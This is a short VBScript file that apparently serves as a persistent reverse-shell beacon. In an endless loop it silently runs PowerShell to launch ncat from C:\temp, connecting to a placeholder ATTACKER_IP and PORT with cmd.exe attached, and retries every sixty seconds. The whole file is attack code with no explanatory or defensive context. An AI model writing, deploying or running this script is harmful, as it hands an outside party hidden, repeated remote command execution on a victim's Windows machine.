Dim ncShell
Set ncShell = WScript.CreateObject("WScript.shell")

Do while True:
	ncShell.Run "powershell.exe C:\temp\ncat.exe ATTACKER_IP PORT -e cmd.exe", 0, true
	WScript.Sleep(60000)
loop
